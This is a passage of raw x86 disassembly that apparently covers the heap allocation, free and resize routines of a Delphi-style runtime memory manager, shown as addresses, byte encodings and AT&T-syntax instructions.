  401d2a:	8b 15 08 c6 41 00    	mov    0x41c608,%edx
  401d30:	89 02                	mov    %eax,(%edx)
  401d32:	a1 08 c6 41 00       	mov    0x41c608,%eax
  401d37:	83 c0 04             	add    $0x4,%eax
  401d3a:	e8 99 fd ff ff       	call   0x401ad8
  401d3f:	33 c0                	xor    %eax,%eax
  401d41:	a3 08 c6 41 00       	mov    %eax,0x41c608
  401d46:	33 c0                	xor    %eax,%eax
  401d48:	a3 04 c6 41 00       	mov    %eax,0x41c604
  401d4d:	c3                   	ret
  401d4e:	8b c0                	mov    %eax,%eax
  401d50:	53                   	push   %ebx
  401d51:	56                   	push   %esi
  401d52:	57                   	push   %edi
  401d53:	83 c4 f0             	add    $0xfffffff0,%esp
  401d56:	8b f0                	mov    %eax,%esi
  401d58:	8d 3c 24             	lea    (%esp),%edi
  401d5b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401d5c:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  401d5d:	8b fc                	mov    %esp,%edi
  401d5f:	e8 a0 ff ff ff       	call   0x401d04
  401d64:	8d 4c 24 08          	lea    0x8(%esp),%ecx
  401d68:	8b d7                	mov    %edi,%edx
  401d6a:	b8 10 c6 41 00       	mov    $0x41c610,%eax
  401d6f:	e8 10 f5 ff ff       	call   0x401284
  401d74:	8b 5c 24 08          	mov    0x8(%esp),%ebx
  401d78:	85 db                	test   %ebx,%ebx
  401d7a:	75 04                	jne    0x401d80
  401d7c:	33 c0                	xor    %eax,%eax
  401d7e:	eb 52                	jmp    0x401dd2
  401d80:	8b 07                	mov    (%edi),%eax
  401d82:	3b d8                	cmp    %eax,%ebx
  401d84:	73 0a                	jae    0x401d90
  401d86:	e8 99 fd ff ff       	call   0x401b24
  401d8b:	29 07                	sub    %eax,(%edi)
  401d8d:	01 47 04             	add    %eax,0x4(%edi)
  401d90:	8b 07                	mov    (%edi),%eax
  401d92:	03 47 04             	add    0x4(%edi),%eax
  401d95:	8b f3                	mov    %ebx,%esi
  401d97:	03 74 24 0c          	add    0xc(%esp),%esi
  401d9b:	3b c6                	cmp    %esi,%eax
  401d9d:	73 08                	jae    0x401da7
  401d9f:	e8 f0 fd ff ff       	call   0x401b94
  401da4:	01 47 04             	add    %eax,0x4(%edi)
  401da7:	8b 07                	mov    (%edi),%eax
  401da9:	03 47 04             	add    0x4(%edi),%eax
  401dac:	3b f0                	cmp    %eax,%esi
  401dae:	75 11                	jne    0x401dc1
  401db0:	83 e8 04             	sub    $0x4,%eax
  401db3:	ba 04 00 00 00       	mov    $0x4,%edx
  401db8:	e8 eb fc ff ff       	call   0x401aa8
  401dbd:	83 6f 04 04          	subl   $0x4,0x4(%edi)
  401dc1:	8b 07                	mov    (%edi),%eax
  401dc3:	a3 08 c6 41 00       	mov    %eax,0x41c608
  401dc8:	8b 47 04             	mov    0x4(%edi),%eax
  401dcb:	a3 04 c6 41 00       	mov    %eax,0x41c604
  401dd0:	b0 01                	mov    $0x1,%al
  401dd2:	83 c4 10             	add    $0x10,%esp
  401dd5:	5f                   	pop    %edi
  401dd6:	5e                   	pop    %esi
  401dd7:	5b                   	pop    %ebx
  401dd8:	c3                   	ret
  401dd9:	8d 40 00             	lea    0x0(%eax),%eax
  401ddc:	53                   	push   %ebx
  401ddd:	83 c4 f8             	add    $0xfffffff8,%esp
  401de0:	8b d8                	mov    %eax,%ebx
  401de2:	8b d4                	mov    %esp,%edx
  401de4:	8d 43 04             	lea    0x4(%ebx),%eax
  401de7:	e8 44 f8 ff ff       	call   0x401630
  401dec:	83 3c 24 00          	cmpl   $0x0,(%esp)
  401df0:	74 0b                	je     0x401dfd
  401df2:	8b c4                	mov    %esp,%eax
  401df4:	e8 57 ff ff ff       	call   0x401d50
  401df9:	84 c0                	test   %al,%al
  401dfb:	75 04                	jne    0x401e01
  401dfd:	33 c0                	xor    %eax,%eax
  401dff:	eb 02                	jmp    0x401e03
  401e01:	b0 01                	mov    $0x1,%al
  401e03:	59                   	pop    %ecx
  401e04:	5a                   	pop    %edx
  401e05:	5b                   	pop    %ebx
  401e06:	c3                   	ret
  401e07:	90                   	nop
  401e08:	53                   	push   %ebx
  401e09:	56                   	push   %esi
  401e0a:	83 c4 f8             	add    $0xfffffff8,%esp
  401e0d:	8b f2                	mov    %edx,%esi
  401e0f:	8b d8                	mov    %eax,%ebx
  401e11:	8b cc                	mov    %esp,%ecx
  401e13:	8d 56 04             	lea    0x4(%esi),%edx
  401e16:	8b c3                	mov    %ebx,%eax
  401e18:	e8 a3 f8 ff ff       	call   0x4016c0
  401e1d:	83 3c 24 00          	cmpl   $0x0,(%esp)
  401e21:	74 0b                	je     0x401e2e
  401e23:	8b c4                	mov    %esp,%eax
  401e25:	e8 26 ff ff ff       	call   0x401d50
  401e2a:	84 c0                	test   %al,%al
  401e2c:	75 04                	jne    0x401e32
  401e2e:	33 c0                	xor    %eax,%eax
  401e30:	eb 02                	jmp    0x401e34
  401e32:	b0 01                	mov    $0x1,%al
  401e34:	59                   	pop    %ecx
  401e35:	5a                   	pop    %edx
  401e36:	5e                   	pop    %esi
  401e37:	5b                   	pop    %ebx
  401e38:	c3                   	ret
  401e39:	8d 40 00             	lea    0x0(%eax),%eax
  401e3c:	33 d2                	xor    %edx,%edx
  401e3e:	85 c0                	test   %eax,%eax
  401e40:	79 03                	jns    0x401e45
  401e42:	83 c0 03             	add    $0x3,%eax
  401e45:	c1 f8 02             	sar    $0x2,%eax
  401e48:	3d 00 04 00 00       	cmp    $0x400,%eax
  401e4d:	7f 16                	jg     0x401e65
  401e4f:	8b 15 0c c6 41 00    	mov    0x41c60c,%edx
  401e55:	8b 54 82 f4          	mov    -0xc(%edx,%eax,4),%edx
  401e59:	85 d2                	test   %edx,%edx
  401e5b:	75 08                	jne    0x401e65
  401e5d:	40                   	inc    %eax
  401e5e:	3d 01 04 00 00       	cmp    $0x401,%eax
  401e63:	75 ea                	jne    0x401e4f
  401e65:	8b c2                	mov    %edx,%eax
  401e67:	c3                   	ret
  401e68:	53                   	push   %ebx
  401e69:	56                   	push   %esi
  401e6a:	57                   	push   %edi
  401e6b:	55                   	push   %ebp
  401e6c:	8b f0                	mov    %eax,%esi
  401e6e:	bf 00 c6 41 00       	mov    $0x41c600,%edi
  401e73:	bd 04 c6 41 00       	mov    $0x41c604,%ebp
  401e78:	8b 1d f8 c5 41 00    	mov    0x41c5f8,%ebx
  401e7e:	3b 73 08             	cmp    0x8(%ebx),%esi
  401e81:	0f 8e 84 00 00 00    	jle    0x401f0b
  401e87:	8b 1f                	mov    (%edi),%ebx
  401e89:	8b 43 08             	mov    0x8(%ebx),%eax
  401e8c:	3b f0                	cmp    %eax,%esi
  401e8e:	7e 7b                	jle    0x401f0b
  401e90:	89 73 08             	mov    %esi,0x8(%ebx)
  401e93:	8b 5b 04             	mov    0x4(%ebx),%ebx
  401e96:	3b 73 08             	cmp    0x8(%ebx),%esi
  401e99:	7f f8                	jg     0x401e93
  401e9b:	8b 17                	mov    (%edi),%edx
  401e9d:	89 42 08             	mov    %eax,0x8(%edx)
  401ea0:	3b 1f                	cmp    (%edi),%ebx
  401ea2:	74 04                	je     0x401ea8
  401ea4:	89 1f                	mov    %ebx,(%edi)
  401ea6:	eb 63                	jmp    0x401f0b
  401ea8:	81 fe 00 10 00 00    	cmp    $0x1000,%esi
  401eae:	7f 0d                	jg     0x401ebd
  401eb0:	8b c6                	mov    %esi,%eax
  401eb2:	e8 85 ff ff ff       	call   0x401e3c
  401eb7:	8b d8                	mov    %eax,%ebx
  401eb9:	85 db                	test   %ebx,%ebx
  401ebb:	75 4e                	jne    0x401f0b
  401ebd:	8b c6                	mov    %esi,%eax
  401ebf:	e8 18 ff ff ff       	call   0x401ddc
  401ec4:	84 c0                	test   %al,%al
  401ec6:	75 07                	jne    0x401ecf
  401ec8:	33 c0                	xor    %eax,%eax
  401eca:	e9 88 00 00 00       	jmp    0x401f57
  401ecf:	3b 75 00             	cmp    0x0(%ebp),%esi
  401ed2:	7f a4                	jg     0x401e78
  401ed4:	29 75 00             	sub    %esi,0x0(%ebp)
  401ed7:	83 7d 00 0c          	cmpl   $0xc,0x0(%ebp)
  401edb:	7d 08                	jge    0x401ee5
  401edd:	03 75 00             	add    0x0(%ebp),%esi
  401ee0:	33 c0                	xor    %eax,%eax
  401ee2:	89 45 00             	mov    %eax,0x0(%ebp)
  401ee5:	a1 08 c6 41 00       	mov    0x41c608,%eax
  401eea:	01 35 08 c6 41 00    	add    %esi,0x41c608
  401ef0:	8b d6                	mov    %esi,%edx
  401ef2:	83 ca 02             	or     $0x2,%edx
  401ef5:	89 10                	mov    %edx,(%eax)
  401ef7:	83 c0 04             	add    $0x4,%eax
  401efa:	ff 05 9c c5 41 00    	incl   0x41c59c
  401f00:	83 ee 04             	sub    $0x4,%esi
  401f03:	01 35 a0 c5 41 00    	add    %esi,0x41c5a0
  401f09:	eb 4c                	jmp    0x401f57
  401f0b:	8b c3                	mov    %ebx,%eax
  401f0d:	e8 02 fb ff ff       	call   0x401a14
  401f12:	8b 53 08             	mov    0x8(%ebx),%edx
  401f15:	8b c2                	mov    %edx,%eax
  401f17:	2b c6                	sub    %esi,%eax
  401f19:	83 f8 0c             	cmp    $0xc,%eax
  401f1c:	7c 0c                	jl     0x401f2a
  401f1e:	8b d3                	mov    %ebx,%edx
  401f20:	03 d6                	add    %esi,%edx
  401f22:	92                   	xchg   %eax,%edx
  401f23:	e8 54 fd ff ff       	call   0x401c7c
  401f28:	eb 12                	jmp    0x401f3c
  401f2a:	8b f2                	mov    %edx,%esi
  401f2c:	3b 1f                	cmp    (%edi),%ebx
  401f2e:	75 05                	jne    0x401f35
  401f30:	8b 43 04             	mov    0x4(%ebx),%eax
  401f33:	89 07                	mov    %eax,(%edi)
  401f35:	8b c3                	mov    %ebx,%eax
  401f37:	03 c6                	add    %esi,%eax
  401f39:	83 20 fe             	andl   $0xfffffffe,(%eax)
  401f3c:	8b c3                	mov    %ebx,%eax
  401f3e:	8b d6                	mov    %esi,%edx
  401f40:	83 ca 02             	or     $0x2,%edx
  401f43:	89 10                	mov    %edx,(%eax)
  401f45:	83 c0 04             	add    $0x4,%eax
  401f48:	ff 05 9c c5 41 00    	incl   0x41c59c
  401f4e:	83 ee 04             	sub    $0x4,%esi
  401f51:	01 35 a0 c5 41 00    	add    %esi,0x41c5a0
  401f57:	5d                   	pop    %ebp
  401f58:	5f                   	pop    %edi
  401f59:	5e                   	pop    %esi
  401f5a:	5b                   	pop    %ebx
  401f5b:	c3                   	ret
  401f5c:	55                   	push   %ebp
  401f5d:	8b ec                	mov    %esp,%ebp
  401f5f:	83 c4 f8             	add    $0xfffffff8,%esp
  401f62:	53                   	push   %ebx
  401f63:	56                   	push   %esi
  401f64:	57                   	push   %edi
  401f65:	8b d8                	mov    %eax,%ebx
  401f67:	80 3d ac c5 41 00 00 	cmpb   $0x0,0x41c5ac
  401f6e:	75 09                	jne    0x401f79
  401f70:	e8 fb f8 ff ff       	call   0x401870
  401f75:	84 c0                	test   %al,%al
  401f77:	74 08                	je     0x401f81
  401f79:	81 fb f8 ff ff 7f    	cmp    $0x7ffffff8,%ebx
  401f7f:	7e 0a                	jle    0x401f8b
  401f81:	33 c0                	xor    %eax,%eax
  401f83:	89 45 fc             	mov    %eax,-0x4(%ebp)
  401f86:	e9 54 01 00 00       	jmp    0x4020df
  401f8b:	33 c9                	xor    %ecx,%ecx
  401f8d:	55                   	push   %ebp
  401f8e:	68 d8 20 40 00       	push   $0x4020d8
  401f93:	64 ff 31             	push   %fs:(%ecx)
  401f96:	64 89 21             	mov    %esp,%fs:(%ecx)
  401f99:	80 3d 35 c0 41 00 00 	cmpb   $0x0,0x41c035
  401fa0:	74 0a                	je     0x401fac
  401fa2:	68 b4 c5 41 00       	push   $0x41c5b4
  401fa7:	e8 20 f2 ff ff       	call   0x4011cc
  401fac:	83 c3 07             	add    $0x7,%ebx
  401faf:	83 e3 fc             	and    $0xfffffffc,%ebx
  401fb2:	83 fb 0c             	cmp    $0xc,%ebx
  401fb5:	7d 05                	jge    0x401fbc
  401fb7:	bb 0c 00 00 00       	mov    $0xc,%ebx
  401fbc:	81 fb 00 10 00 00    	cmp    $0x1000,%ebx
  401fc2:	0f 8f 93 00 00 00    	jg     0x40205b
  401fc8:	8b c3                	mov    %ebx,%eax
  401fca:	85 c0                	test   %eax,%eax
  401fcc:	79 03                	jns    0x401fd1
  401fce:	83 c0 03             	add    $0x3,%eax
  401fd1:	c1 f8 02             	sar    $0x2,%eax
  401fd4:	8b 15 0c c6 41 00    	mov    0x41c60c,%edx
  401fda:	8b 54 82 f4          	mov    -0xc(%edx,%eax,4),%edx
  401fde:	85 d2                	test   %edx,%edx
  401fe0:	74 79                	je     0x40205b
  401fe2:	8b f2                	mov    %edx,%esi
  401fe4:	8b c6                	mov    %esi,%eax
  401fe6:	03 c3                	add    %ebx,%eax
  401fe8:	83 20 fe             	andl   $0xfffffffe,(%eax)
  401feb:	8b 42 04             	mov    0x4(%edx),%eax
  401fee:	3b d0                	cmp    %eax,%edx
  401ff0:	75 1a                	jne    0x40200c
  401ff2:	8b c3                	mov    %ebx,%eax
  401ff4:	85 c0                	test   %eax,%eax
  401ff6:	79 03                	jns    0x401ffb
  401ff8:	83 c0 03             	add    $0x3,%eax
  401ffb:	c1 f8 02             	sar    $0x2,%eax
  401ffe:	8b 0d 0c c6 41 00    	mov    0x41c60c,%ecx
  402004:	33 ff                	xor    %edi,%edi
  402006:	89 7c 81 f4          	mov    %edi,-0xc(%ecx,%eax,4)
  40200a:	eb 26                	jmp    0x402032
  40200c:	8b cb                	mov    %ebx,%ecx
  40200e:	85 c9                	test   %ecx,%ecx
  402010:	79 03                	jns    0x402015
  402012:	83 c1 03             	add    $0x3,%ecx
  402015:	c1 f9 02             	sar    $0x2,%ecx
  402018:	8b 3d 0c c6 41 00    	mov    0x41c60c,%edi
  40201e:	89 44 8f f4          	mov    %eax,-0xc(%edi,%ecx,4)
  402022:	8b 0a                	mov    (%edx),%ecx
  402024:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  402027:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40202a:	89 41 04             	mov    %eax,0x4(%ecx)
  40202d:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  402030:	89 08                	mov    %ecx,(%eax)
  402032:	8b c6                	mov    %esi,%eax
  402034:	8b 52 08             	mov    0x8(%edx),%edx
  402037:	83 ca 02             	or     $0x2,%edx
  40203a:	89 10                	mov    %edx,(%eax)
  40203c:	83 c0 04             	add    $0x4,%eax
  40203f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402042:	ff 05 9c c5 41 00    	incl   0x41c59c
  402048:	83 eb 04             	sub    $0x4,%ebx
  40204b:	01 1d a0 c5 41 00    	add    %ebx,0x41c5a0
  402051:	e8 e6 0f 00 00       	call   0x40303c
  402056:	e9 84 00 00 00       	jmp    0x4020df
  40205b:	3b 1d 04 c6 41 00    	cmp    0x41c604,%ebx
  402061:	7f 4a                	jg     0x4020ad
  402063:	29 1d 04 c6 41 00    	sub    %ebx,0x41c604
  402069:	83 3d 04 c6 41 00 0c 	cmpl   $0xc,0x41c604
  402070:	7d 0d                	jge    0x40207f
  402072:	03 1d 04 c6 41 00    	add    0x41c604,%ebx
  402078:	33 c0                	xor    %eax,%eax
  40207a:	a3 04 c6 41 00       	mov    %eax,0x41c604
  40207f:	a1 08 c6 41 00       	mov    0x41c608,%eax
  402084:	01 1d 08 c6 41 00    	add    %ebx,0x41c608
  40208a:	8b d3                	mov    %ebx,%edx
  40208c:	83 ca 02             	or     $0x2,%edx
  40208f:	89 10                	mov    %edx,(%eax)
  402091:	83 c0 04             	add    $0x4,%eax
  402094:	89 45 fc             	mov    %eax,-0x4(%ebp)
  402097:	ff 05 9c c5 41 00    	incl   0x41c59c
  40209d:	83 eb 04             	sub    $0x4,%ebx
  4020a0:	01 1d a0 c5 41 00    	add    %ebx,0x41c5a0
  4020a6:	e8 91 0f 00 00       	call   0x40303c
  4020ab:	eb 32                	jmp    0x4020df
  4020ad:	8b c3                	mov    %ebx,%eax
  4020af:	e8 b4 fd ff ff       	call   0x401e68
  4020b4:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4020b7:	33 c0                	xor    %eax,%eax
  4020b9:	5a                   	pop    %edx
  4020ba:	59                   	pop    %ecx
  4020bb:	59                   	pop    %ecx
  4020bc:	64 89 10             	mov    %edx,%fs:(%eax)
  4020bf:	68 df 20 40 00       	push   $0x4020df
  4020c4:	80 3d 35 c0 41 00 00 	cmpb   $0x0,0x41c035
  4020cb:	74 0a                	je     0x4020d7
  4020cd:	68 b4 c5 41 00       	push   $0x41c5b4
  4020d2:	e8 fd f0 ff ff       	call   0x4011d4
  4020d7:	c3                   	ret
  4020d8:	e9 a3 0e 00 00       	jmp    0x402f80
  4020dd:	eb e5                	jmp    0x4020c4
  4020df:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4020e2:	5f                   	pop    %edi
  4020e3:	5e                   	pop    %esi
  4020e4:	5b                   	pop    %ebx
  4020e5:	59                   	pop    %ecx
  4020e6:	59                   	pop    %ecx
  4020e7:	5d                   	pop    %ebp
  4020e8:	c3                   	ret
  4020e9:	8d 40 00             	lea    0x0(%eax),%eax
  4020ec:	55                   	push   %ebp
  4020ed:	8b ec                	mov    %esp,%ebp
  4020ef:	51                   	push   %ecx
  4020f0:	53                   	push   %ebx
  4020f1:	56                   	push   %esi
  4020f2:	57                   	push   %edi
  4020f3:	8b d8                	mov    %eax,%ebx
  4020f5:	33 c0                	xor    %eax,%eax
  4020f7:	a3 b0 c5 41 00       	mov    %eax,0x41c5b0
  4020fc:	80 3d ac c5 41 00 00 	cmpb   $0x0,0x41c5ac
  402103:	75 1f                	jne    0x402124
  402105:	e8 66 f7 ff ff       	call   0x401870
  40210a:	84 c0                	test   %al,%al
  40210c:	75 16                	jne    0x402124
  40210e:	c7 05 b0 c5 41 00 08 	movl   $0x8,0x41c5b0
  402115:	00 00 00 
  402118:	c7 45 fc 08 00 00 00 	movl   $0x8,-0x4(%ebp)
  40211f:	e9 61 01 00 00       	jmp    0x402285
  402124:	33 c9                	xor    %ecx,%ecx
  402126:	55                   	push   %ebp
  402127:	68 7e 22 40 00       	push   $0x40227e
  40212c:	64 ff 31             	push   %fs:(%ecx)
  40212f:	64 89 21             	mov    %esp,%fs:(%ecx)
  402132:	80 3d 35 c0 41 00 00 	cmpb   $0x0,0x41c035
  402139:	74 0a                	je     0x402145
  40213b:	68 b4 c5 41 00       	push   $0x41c5b4
  402140:	e8 87 f0 ff ff       	call   0x4011cc
  402145:	8b f3                	mov    %ebx,%esi
  402147:	83 ee 04             	sub    $0x4,%esi
  40214a:	8b 1e                	mov    (%esi),%ebx
  40214c:	f6 c3 02             	test   $0x2,%bl
  40214f:	75 0f                	jne    0x402160
  402151:	c7 05 b0 c5 41 00 09 	movl   $0x9,0x41c5b0
  402158:	00 00 00 
  40215b:	e9 f5 00 00 00       	jmp    0x402255
  402160:	ff 0d 9c c5 41 00    	decl   0x41c59c
  402166:	8b c3                	mov    %ebx,%eax
  402168:	25 fc ff ff 7f       	and    $0x7ffffffc,%eax
  40216d:	83 e8 04             	sub    $0x4,%eax
  402170:	29 05 a0 c5 41 00    	sub    %eax,0x41c5a0
  402176:	f6 c3 01             	test   $0x1,%bl
  402179:	74 45                	je     0x4021c0
  40217b:	8b c6                	mov    %esi,%eax
  40217d:	83 e8 0c             	sub    $0xc,%eax
  402180:	8b 50 08             	mov    0x8(%eax),%edx
  402183:	83 fa 0c             	cmp    $0xc,%edx
  402186:	7c 08                	jl     0x402190
  402188:	f7 c2 03 00 00 80    	test   $0x80000003,%edx
  40218e:	74 0f                	je     0x40219f
  402190:	c7 05 b0 c5 41 00 0a 	movl   $0xa,0x41c5b0
  402197:	00 00 00 
  40219a:	e9 b6 00 00 00       	jmp    0x402255
  40219f:	8b c6                	mov    %esi,%eax
  4021a1:	2b c2                	sub    %edx,%eax
  4021a3:	3b 50 08             	cmp    0x8(%eax),%edx
  4021a6:	74 0f                	je     0x4021b7
  4021a8:	c7 05 b0 c5 41 00 0a 	movl   $0xa,0x41c5b0
  4021af:	00 00 00 
  4021b2:	e9 9e 00 00 00       	jmp    0x402255
  4021b7:	03 da                	add    %edx,%ebx
  4021b9:	8b f0                	mov    %eax,%esi
  4021bb:	e8 54 f8 ff ff       	call   0x401a14
  4021c0:	81 e3 fc ff ff 7f    	and    $0x7ffffffc,%ebx
  4021c6:	8b c6                	mov    %esi,%eax
  4021c8:	03 c3                	add    %ebx,%eax
  4021ca:	8b f8                	mov    %eax,%edi
  4021cc:	3b 3d 08 c6 41 00    	cmp    0x41c608,%edi
  4021d2:	75 2c                	jne    0x402200
  4021d4:	29 1d 08 c6 41 00    	sub    %ebx,0x41c608
  4021da:	01 1d 04 c6 41 00    	add    %ebx,0x41c604
  4021e0:	81 3d 04 c6 41 00 00 	cmpl   $0x3c00,0x41c604
  4021e7:	3c 00 00 
  4021ea:	7e 05                	jle    0x4021f1
  4021ec:	e8 13 fb ff ff       	call   0x401d04
  4021f1:	33 c0                	xor    %eax,%eax
  4021f3:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4021f6:	e8 41 0e 00 00       	call   0x40303c
  4021fb:	e9 85 00 00 00       	jmp    0x402285
  402200:	8b 10                	mov    (%eax),%edx
  402202:	f6 c2 02             	test   $0x2,%dl
  402205:	74 1c                	je     0x402223
  402207:	81 e2 fc ff ff 7f    	and    $0x7ffffffc,%edx
  40220d:	83 fa 04             	cmp    $0x4,%edx
  402210:	7d 0c                	jge    0x40221e
  402212:	c7 05 b0 c5 41 00 0b 	movl   $0xb,0x41c5b0
  402219:	00 00 00 
  40221c:	eb 37                	jmp    0x402255
  40221e:	83 08 01             	orl    $0x1,(%eax)
  402221:	eb 29                	jmp    0x40224c
  402223:	8b c7                	mov    %edi,%eax
  402225:	83 78 04 00          	cmpl   $0x0,0x4(%eax)
  402229:	74 0b                	je     0x402236
  40222b:	83 38 00             	cmpl   $0x0,(%eax)
  40222e:	74 06                	je     0x402236
  402230:	83 78 08 0c          	cmpl   $0xc,0x8(%eax)
  402234:	7d 0c                	jge    0x402242
  402236:	c7 05 b0 c5 41 00 0b 	movl   $0xb,0x41c5b0
  40223d:	00 00 00 
  402240:	eb 13                	jmp    0x402255
  402242:	8b 50 08             	mov    0x8(%eax),%edx
  402245:	03 da                	add    %edx,%ebx
  402247:	e8 c8 f7 ff ff       	call   0x401a14
  40224c:	8b d3                	mov    %ebx,%edx
  40224e:	8b c6                	mov    %esi,%eax
  402250:	e8 27 fa ff ff       	call   0x401c7c
  402255:	a1 b0 c5 41 00       	mov    0x41c5b0,%eax
  40225a:	89 45 fc             	mov    %eax,-0x4(%ebp)
  40225d:	33 c0                	xor    %eax,%eax
  40225f:	5a                   	pop    %edx
  402260:	59                   	pop    %ecx
  402261:	59                   	pop    %ecx
  402262:	64 89 10             	mov    %edx,%fs:(%eax)
  402265:	68 85 22 40 00       	push   $0x402285
  40226a:	80 3d 35 c0 41 00 00 	cmpb   $0x0,0x41c035
  402271:	74 0a                	je     0x40227d
  402273:	68 b4 c5 41 00       	push   $0x41c5b4
  402278:	e8 57 ef ff ff       	call   0x4011d4
  40227d:	c3                   	ret
  40227e:	e9 fd 0c 00 00       	jmp    0x402f80
  402283:	eb e5                	jmp    0x40226a
  402285:	8b 45 fc             	mov    -0x4(%ebp),%eax
  402288:	5f                   	pop    %edi
  402289:	5e                   	pop    %esi
  40228a:	5b                   	pop    %ebx
  40228b:	59                   	pop    %ecx
  40228c:	5d                   	pop    %ebp
  40228d:	c3                   	ret
  40228e:	8b c0                	mov    %eax,%eax
  402290:	53                   	push   %ebx
  402291:	56                   	push   %esi
  402292:	57                   	push   %edi
  402293:	55                   	push   %ebp
  402294:	83 c4 f8             	add    $0xfffffff8,%esp
  402297:	8b f2                	mov    %edx,%esi
  402299:	83 c6 07             	add    $0x7,%esi
  40229c:	83 e6 fc             	and    $0xfffffffc,%esi
  40229f:	83 fe 0c             	cmp    $0xc,%esi
  4022a2:	7d 05                	jge    0x4022a9
  4022a4:	be 0c 00 00 00       	mov    $0xc,%esi
  4022a9:	8b e8                	mov    %eax,%ebp
  4022ab:	83 ed 04             	sub    $0x4,%ebp
  4022ae:	8b 7d 00             	mov    0x0(%ebp),%edi
  4022b1:	81 e7 fc ff ff 7f    	and    $0x7ffffffc,%edi
  4022b7:	8b c5                	mov    %ebp,%eax
  4022b9:	03 c7                	add    %edi,%eax
  4022bb:	8b d8                	mov    %eax,%ebx
  4022bd:	3b fe                	cmp    %esi,%edi
  4022bf:	75 07                	jne    0x4022c8
  4022c1:	b0 01                	mov    $0x1,%al
  4022c3:	e9 9b 01 00 00       	jmp    0x402463
  4022c8:	3b fe                	cmp    %esi,%edi
  4022ca:	0f 8e 83 00 00 00    	jle    0x402353
  4022d0:	8b d7                	mov    %edi,%edx
  4022d2:	2b d6                	sub    %esi,%edx
  4022d4:	89 14 24             	mov    %edx,(%esp)
  4022d7:	3b 1d 08 c6 41 00    	cmp    0x41c608,%ebx
  4022dd:	75 38                	jne    0x402317
  4022df:	8b 04 24             	mov    (%esp),%eax
  4022e2:	29 05 08 c6 41 00    	sub    %eax,0x41c608
  4022e8:	8b 04 24             	mov    (%esp),%eax
  4022eb:	01 05 04 c6 41 00    	add    %eax,0x41c604
  4022f1:	83 3d 04 c6 41 00 0c 	cmpl   $0xc,0x41c604
  4022f8:	0f 8d 4c 01 00 00    	jge    0x40244a
  4022fe:	8b 04 24             	mov    (%esp),%eax
  402301:	01 05 08 c6 41 00    	add    %eax,0x41c608
  402307:	8b 04 24             	mov    (%esp),%eax
  40230a:	29 05 04 c6 41 00    	sub    %eax,0x41c604
  402310:	8b f7                	mov    %edi,%esi
  402312:	e9 33 01 00 00       	jmp    0x40244a
  402317:	8b d8                	mov    %eax,%ebx
  402319:	f6 03 02             	testb  $0x2,(%ebx)
  40231c:	75 0d                	jne    0x40232b
  40231e:	8b c3                	mov    %ebx,%eax
  402320:	8b 50 08             	mov    0x8(%eax),%edx
  402323:	01 14 24             	add    %edx,(%esp)
  402326:	e8 e9 f6 ff ff       	call   0x401a14
  40232b:	83 3c 24 0c          	cmpl   $0xc,(%esp)
  40232f:	7c 1b                	jl     0x40234c
  402331:	8b dd                	mov    %ebp,%ebx
  402333:	03 de                	add    %esi,%ebx
  402335:	8b 04 24             	mov    (%esp),%eax
  402338:	83 c8 02             	or     $0x2,%eax
  40233b:	89 03                	mov    %eax,(%ebx)
  40233d:	8b c3                	mov    %ebx,%eax
  40233f:	83 c0 04             	add    $0x4,%eax
  402342:	e8 91 f7 ff ff       	call   0x401ad8
  402347:	e9 fe 00 00 00       	jmp    0x40244a
  40234c:	8b f7                	mov    %edi,%esi
  40234e:	e9 f7 00 00 00       	jmp    0x40244a
  402353:	8b c6                	mov    %esi,%eax
  402355:	2b c7                	sub    %edi,%eax
  402357:	89 44 24 04          	mov    %eax,0x4(%esp)
  40235b:	3b 1d 08 c6 41 00    	cmp    0x41c608,%ebx
  402361:	75 67                	jne    0x4023ca
  402363:	a1 04 c6 41 00       	mov    0x41c604,%eax
  402368:	3b 44 24 04          	cmp    0x4(%esp),%eax
  40236c:	7c 53                	jl     0x4023c1
  40236e:	8b 44 24 04          	mov    0x4(%esp),%eax
  402372:	29 05 04 c6 41 00    	sub    %eax,0x41c604
  402378:	8b 44 24 04          	mov    0x4(%esp),%eax
  40237c:	01 05 08 c6 41 00    	add    %eax,0x41c608
  402382:	83 3d 04 c6 41 00 0c 	cmpl   $0xc,0x41c604
  402389:	7d 18                	jge    0x4023a3
  40238b:	a1 04 c6 41 00       	mov    0x41c604,%eax
  402390:	01 05 08 c6 41 00    	add    %eax,0x41c608
  402396:	03 35 04 c6 41 00    	add    0x41c604,%esi
  40239c:	33 c0                	xor    %eax,%eax
  40239e:	a3 04 c6 41 00       	mov    %eax,0x41c604
  4023a3:	8b c6                	mov    %esi,%eax
  4023a5:	2b c7                	sub    %edi,%eax
  4023a7:	01 05 a0 c5 41 00    	add    %eax,0x41c5a0
  4023ad:	8b 45 00             	mov    0x0(%ebp),%eax
  4023b0:	25 03 00 00 80       	and    $0x80000003,%eax
  4023b5:	0b f0                	or     %eax,%esi
  4023b7:	89 75 00             	mov    %esi,0x0(%ebp)
  4023ba:	b0 01                	mov    $0x1,%al
  4023bc:	e9 a2 00 00 00       	jmp    0x402463
  4023c1:	e8 3e f9 ff ff       	call   0x401d04
  4023c6:	8b dd                	mov    %ebp,%ebx
  4023c8:	03 df                	add    %edi,%ebx
  4023ca:	f6 03 02             	testb  $0x2,(%ebx)
  4023cd:	75 4d                	jne    0x40241c
  4023cf:	8b d3                	mov    %ebx,%edx
  4023d1:	8b c2                	mov    %edx,%eax
  4023d3:	8b 48 08             	mov    0x8(%eax),%ecx
  4023d6:	89 0c 24             	mov    %ecx,(%esp)
  4023d9:	8b 0c 24             	mov    (%esp),%ecx
  4023dc:	3b 4c 24 04          	cmp    0x4(%esp),%ecx
  4023e0:	7d 0e                	jge    0x4023f0
  4023e2:	03 14 24             	add    (%esp),%edx
  4023e5:	8b da                	mov    %edx,%ebx
  4023e7:	8b 04 24             	mov    (%esp),%eax
  4023ea:	29 44 24 04          	sub    %eax,0x4(%esp)
  4023ee:	eb 2c                	jmp    0x40241c
  4023f0:	e8 1f f6 ff ff       	call   0x401a14
  4023f5:	8b 44 24 04          	mov    0x4(%esp),%eax
  4023f9:	29 04 24             	sub    %eax,(%esp)
  4023fc:	83 3c 24 0c          	cmpl   $0xc,(%esp)
  402400:	7c 0e                	jl     0x402410
